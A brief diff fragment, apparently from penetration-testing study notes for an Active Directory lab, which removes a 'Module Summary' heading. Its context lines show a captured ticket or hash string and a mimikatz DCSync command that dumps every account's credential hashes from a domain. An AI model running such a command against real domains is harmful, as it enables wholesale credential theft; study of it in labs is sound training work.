@@ -233,4 +233,3 @@ user     http/DC1.sos.labs:80  $krP5tgsah.sos.1abs:80:2D3F45B329C2C2
   - mimikatz # lsadump::dcsync /domain:cpent.local /all /csv
  
 ## LAB Active Directory
-## Module Summary
